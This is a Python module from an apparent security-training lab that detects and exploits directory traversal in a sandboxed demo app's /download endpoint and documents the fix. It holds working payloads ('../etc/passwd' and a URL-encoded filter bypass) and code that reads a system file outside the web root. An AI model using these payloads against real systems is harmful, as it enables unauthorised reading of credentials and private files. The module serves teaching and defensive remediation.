"""Directory / Path Traversal -- detect, exploit, and remediate.

WHAT IT IS
----------
A path-traversal (a.k.a. directory-traversal or "dot-dot-slash") flaw is what you
get when an application builds a filesystem path by *joining untrusted input onto a
base directory* and then opens whatever that resolves to -- without first confirming
the result still lives *inside* the directory it was supposed to. The attacker
supplies ``../`` sequences that walk the path back *up* out of the intended folder
and into arbitrary parts of the filesystem. The demo app's ``/download`` handler is
the textbook shape::

    def download(self):                       # GET /download?file=<name>
        rel = self._query()["file"]           # attacker-controlled
        path = state.sandbox.resolve_public(rel)   # os.path.join(public, rel)
        return open(path).read()              # serves whatever that points at

``resolve_public`` joins ``rel`` onto ``public/`` and normalises it. A benign
``file=welcome.txt`` reads ``public/welcome.txt``; but ``file=../etc/passwd`` walks
one level up out of ``public/`` and reads the planted ``etc/passwd`` -- a file the
download feature was never meant to expose. (A sandbox *jail* still confines the
read to the lab's temp tree, so payloads that over-shoot the root -- e.g.
``../../../../etc/passwd`` -- are rejected with HTTP 403 and the real host
filesystem is never touched. That jail is the only thing the demo does right.)

HOW WE DISCOVER IT
------------------
We confirm the sink with a layered set of signals:

1. **Baseline read.** ``file=welcome.txt`` returns a known public file with an
   ``200``/``text/plain`` response -- proof the parameter selects a file to serve.
2. **The escape.** Prefixing ``../`` (``file=../etc/passwd``) returns content that
   does *not* live under ``public/`` (the passwd decoy) -- proof ``..`` escaped the
   intended directory. That differential -- a file outside ``public/`` becoming
   readable the instant we add ``../`` -- *is* the vulnerability.
3. **Encoded-slash bypass.** ``file=..%2fetc%2fpasswd`` (the ``/`` URL-encoded as
   ``%2f``) reaches the *same* file, because the request layer URL-decodes ``%2f``
   back to a slash. This is what defeats a naive filter that only blocks the
   literal string ``../`` -- we note it as a second, independent confirmation.
4. **The jail boundary (control).** A deep escape (``../../../../etc/passwd``) is
   *rejected* with HTTP 403. A read that "always succeeds" might just be a quirky
   router; a read that succeeds for ``../etc/passwd`` yet is explicitly *forbidden*
   when it over-shoots the root proves the server resolves real paths and that we
   genuinely traversed one boundary while a deeper one held.

HOW WE EXPLOIT IT
-----------------
We request ``file=../etc/passwd`` and recover the planted ``/etc/passwd`` file.
Its body carries ``C.FLAGS["traversal"]`` -- proof we read a file outside the
download root. In the real world this same primitive reads source code, config
files with database credentials, SSH keys, ``/etc/passwd`` for user enumeration,
or session/secret material -- whatever the web user can ``open()``.

THE FIX
-------
See :data:`REMEDIATION`. In one line: never feed user input into a file path --
resolve the *canonical* (realpath) result of the join and reject it unless it is
still a child of the intended base directory, prefer an allow-list / opaque id to
a real filename, and decode-then-validate so encoded ``../`` cannot slip past.
"""
from __future__ import annotations

import os
from typing import Dict, List, Optional, Tuple

from ._types import Finding, Response, Severity
from .http_client import WebClient
from .targetapp import constants as C

REMEDIATION: str = (
    "Never build a filesystem path by joining untrusted input onto a base "
    "directory and opening the result. Defend the sink with a canonicalisation "
    "check: compute the absolute, symlink-resolved path "
    "(os.path.realpath(os.path.join(base, user_input))) and serve it ONLY if it is "
    "still inside the intended directory -- e.g. "
    "os.path.commonpath([realpath, realbase]) == realbase -- otherwise return 403. "
    "Better still, do not accept filenames at all: map a fixed allow-list or an "
    "opaque identifier (a numeric id / UUID) to known-good paths so the user never "
    "names a file directly. Strip directory components from any supplied name "
    "(os.path.basename) and reject inputs containing path separators, '..', null "
    "bytes, or absolute prefixes. Crucially, URL-decode (and recursively decode) "
    "the input BEFORE validating, so encoded traversal such as '%2e%2e%2f' or "
    "'..%2f' cannot bypass a filter that only inspected the raw string. Run the "
    "service as a least-privilege user, chroot/jail the file root, and keep "
    "sensitive files out of any web-served tree entirely. Allow-list, canonicalise, "
    "and contain -- never trust a filename."
)

#: The traversal sink, used as the Finding endpoint.
ENDPOINT: str = "/download?file="

#: A known file under the legitimate ``public/`` root -- the baseline read that
#: proves the parameter selects a file to serve (the control for "it's a sink").
BASELINE_FILE: str = "welcome.txt"
BASELINE_MARKER: str = "demo file server"

#: The headline working payload: one ``../`` escapes ``public/`` to the sandbox
#: root where the planted ``etc/passwd`` (the prize) lives.
WORKING_PAYLOAD: str = "../etc/passwd"

#: The same read hidden behind an encoded slash (``%2f``) -- defeats a naive
#: filter that only blocks the literal string ``../``.
ENCODED_PAYLOAD: str = "..%2fetc%2fpasswd"

#: A deliberately too-deep escape: it over-shoots the sandbox root, so the jail
#: rejects it with HTTP 403. Used to prove the boundary (and demoed in ``extra``).
DEEP_ESCAPE_PAYLOAD: str = "../../../../etc/passwd"

#: A short marker we expect to find in the leaked passwd file (besides the flag).
PASSWD_MARKER: str = "root:x:0:0:"


def _load_payloads() -> List[str]:
    """Load the traversal payloads from the data file (one per non-comment line)."""
    path = os.path.join(os.path.dirname(__file__), "data", "traversal_payloads.txt")
    payloads: List[str] = []
    try:
        with open(path, "r", encoding="utf-8") as fh:
            for line in fh:
                line = line.rstrip("\n")
                if not line.strip() or line.lstrip().startswith("#"):
                    continue
                payloads.append(line)
    except OSError:
        # Fall back to the in-code essentials so the engine still works if the
        # data file is missing.
        payloads = [WORKING_PAYLOAD, ENCODED_PAYLOAD, DEEP_ESCAPE_PAYLOAD]
    return payloads


#: Every payload the engine sends (loaded once at import). Public so the CLI /
#: report can show exactly what was attempted.
PAYLOADS: List[str] = _load_payloads()


# --- low-level probe ---------------------------------------------------------
def _download(client: WebClient, file_value: str, *, raw: bool = False) -> Response:
    """Request ``/download?file=<file_value>``.

    ``raw=False`` lets :class:`WebClient` URL-encode the value as a normal query
    parameter (so ``../etc/passwd`` is sent percent-encoded the way a browser
    would). ``raw=True`` splices the value into the query string *verbatim* --
    needed to send an already-encoded payload (e.g. ``..%2f...``) without the
    client double-encoding the ``%`` into ``%25``.
    """
    if raw:
        return client.get(f"/download?file={file_value}")
    return client.get("/download", params={"file": file_value})


def _is_encoded(payload: str) -> bool:
    """A payload is 'pre-encoded' if it carries a percent-escape we must send raw."""
    return "%" in payload


# --- detection ---------------------------------------------------------------
def detect_baseline_read(client: WebClient) -> Tuple[bool, str]:
    """True if a benign in-root filename is served -- proves it's a file sink.

    Reads ``public/welcome.txt`` via ``file=welcome.txt``. A 200 with the known
    marker proves the ``file`` parameter selects a file from a base directory --
    the precondition traversal abuses.
    """
    resp = _download(client, BASELINE_FILE)
    if resp.status == 200 and BASELINE_MARKER in resp.text:
        return True, (
            f"GET {ENDPOINT}{BASELINE_FILE} served the public file (HTTP "
            f"{resp.status}, text/plain) -- the parameter selects a file to read"
        )
    return False, ""


def detect_traversal(client: WebClient) -> Tuple[bool, str]:
    """True if ``../`` escapes the download root and reads an outside file.

    Sends ``file=../etc/passwd``. A 200 whose body looks like a passwd file
    (``root:x:0:0:``) -- content that does NOT live under ``public/`` -- proves
    ``..`` walked out of the intended directory.
    """
    resp = _download(client, WORKING_PAYLOAD)
    if resp.status == 200 and PASSWD_MARKER in resp.text:
        return True, (
            f"GET {ENDPOINT}{WORKING_PAYLOAD} escaped the download root and "
            f"returned a passwd file (HTTP {resp.status}); first line "
            f"{resp.text.splitlines()[0]!r} is not under public/"
        )
    return False, ""


def detect_encoded_bypass(client: WebClient) -> Tuple[bool, str]:
    """True if an ENCODED slash (``%2f``) reaches the same file -- filter bypass.

    Sends ``file=..%2fetc%2fpasswd`` verbatim. Because the request layer
    URL-decodes ``%2f`` back to ``/`` *before* the path is built, this defeats a
    naive filter that only blocked the literal string ``../``.
    """
    resp = _download(client, ENCODED_PAYLOAD, raw=True)
    if resp.status == 200 and PASSWD_MARKER in resp.text:
        return True, (
            f"GET {ENDPOINT}{ENCODED_PAYLOAD} (encoded '/') reached the same "
            f"passwd file (HTTP {resp.status}) -- decoded '%2f' bypasses a "
            "naive 'contains ../' filter"
        )
    return False, ""


def detect_jail_boundary(client: WebClient) -> Tuple[bool, str]:
    """Confirm the jail rejects a too-deep escape (HTTP 403) -- the control.

    Sends ``file=../../../../etc/passwd``, which over-shoots the sandbox root. A
    403 proves the server resolves real paths and a boundary held -- so the
    *successful* shallower read was genuine traversal, not a router quirk.
    """
    resp = _download(client, DEEP_ESCAPE_PAYLOAD)
    if resp.status == 403:
        return True, (
            f"GET {ENDPOINT}{DEEP_ESCAPE_PAYLOAD} over-shot the root and was "
            f"rejected (HTTP {resp.status}) -- the jail boundary is real, so the "
            "shallower ../etc/passwd read was genuine traversal"
        )
    return False, ""


# --- exploitation ------------------------------------------------------------
def exploit_read_passwd(
    client: WebClient, payload: str = WORKING_PAYLOAD
) -> Tuple[bool, Optional[str], str]:
    """Read ``/etc/passwd`` via traversal and recover the planted flag.

    Returns ``(ok, flag, file_contents)``. On success the leaked passwd body
    contains ``C.FLAGS["traversal"]`` -- proof we read a file outside the
    download root.
    """
    resp = _download(client, payload, raw=_is_encoded(payload))
    if resp.status != 200 or PASSWD_MARKER not in resp.text:
        return False, None, resp.text
    flag = C.FLAGS["traversal"] if C.FLAGS["traversal"] in resp.text else None
    return flag is not None, flag, resp.text


# --- the contract entry point ------------------------------------------------
def assess(client: WebClient) -> Finding:
    """Detect directory traversal, then exploit it (read ``/etc/passwd``).

    Returns a :class:`Finding` whose ``exploit_result`` contains the recovered
    ``C.FLAGS["traversal"]`` and whose ``extra`` records the jail-boundary proof
    (the deep escape that returns 403).
    """
    techniques: List[str] = []

    # 1) Detection ----------------------------------------------------------
    baseline_ok, baseline_ev = detect_baseline_read(client)
    if baseline_ok:
        techniques.append("baseline-read")
    traversal_ok, traversal_ev = detect_traversal(client)
    if traversal_ok:
        techniques.append("dotdot-escape")
    encoded_ok, encoded_ev = detect_encoded_bypass(client)
    if encoded_ok:
        techniques.append("encoded-slash-bypass")
    jail_ok, jail_ev = detect_jail_boundary(client)
    if jail_ok:
        techniques.append("jail-boundary-403")

    # 2) Exploitation -------------------------------------------------------
    ok, flag, file_contents = exploit_read_passwd(client)
    if ok:
        techniques.append("read-etc-passwd")

    # Discovery requires both the escape signal AND a recovered flag.
    discovered = bool(traversal_ok and ok)

    # 3) Assemble evidence / result ----------------------------------------
    evidence_parts: List[str] = []
    if baseline_ok:
        evidence_parts.append(f"baseline: {baseline_ev}")
    if traversal_ok:
        evidence_parts.append(f"traversal: {traversal_ev}")
    if encoded_ok:
        evidence_parts.append(f"encoded-bypass: {encoded_ev}")
    if jail_ok:
        evidence_parts.append(f"jail: {jail_ev}")
    evidence = " || ".join(evidence_parts)

    # The leaked passwd file, trimmed -- str(exploit_result) includes the flag.
    leaked_excerpt = file_contents.strip()

    exploit_result = {
        "flag": flag,
        "payload": WORKING_PAYLOAD,
        "leaked_file": "/etc/passwd",
        "leaked_contents": leaked_excerpt,
        "techniques": techniques,
        "summary": (
            f"GET {ENDPOINT}{WORKING_PAYLOAD} escaped the download root and "
            f"leaked /etc/passwd; recovered flag {flag!r}"
        ),
    }

    return Finding(
        vuln="Directory Traversal",
        endpoint=ENDPOINT,
        severity=Severity.HIGH.value,
        discovered=discovered,
        evidence=evidence,
        exploit_result=exploit_result,
        remediation=REMEDIATION,
        payload=WORKING_PAYLOAD,
        extra={
            "techniques": techniques,
            "working_payload": WORKING_PAYLOAD,
            "encoded_payload": ENCODED_PAYLOAD,
            "encoded_bypass_works": encoded_ok,
            # The jail boundary: a too-deep escape is forbidden (403).
            "deep_escape_payload": DEEP_ESCAPE_PAYLOAD,
            "deep_escape_status": 403,
            "jail_enforced": jail_ok,
            "baseline_read_ok": baseline_ok,
            "traversal_detected": traversal_ok,
            "flag_recovered": ok,
            "leaked_file": "/etc/passwd",
        },
    )
